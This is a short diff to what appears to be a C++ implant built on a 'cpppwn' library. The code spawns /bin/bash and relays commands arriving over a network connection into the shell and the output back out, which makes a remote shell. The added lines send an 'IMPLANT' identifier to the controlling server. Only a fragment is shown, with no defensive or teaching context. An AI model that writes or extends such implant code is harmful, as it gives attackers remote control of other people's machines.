@@ -36,6 +36,9 @@ public:
             cpppwn::Process shell("/bin/bash");
             logger::debug("Session {}: Connection established and shell spawned.", session_id);
 
+            //identify to the server
+            conn.sendline("IMPLANT");
+
             while (global_running && conn.is_alive() && shell.is_alive()) {
                 shell.send(conn.recvline());
                 conn.send(shell.recvall());
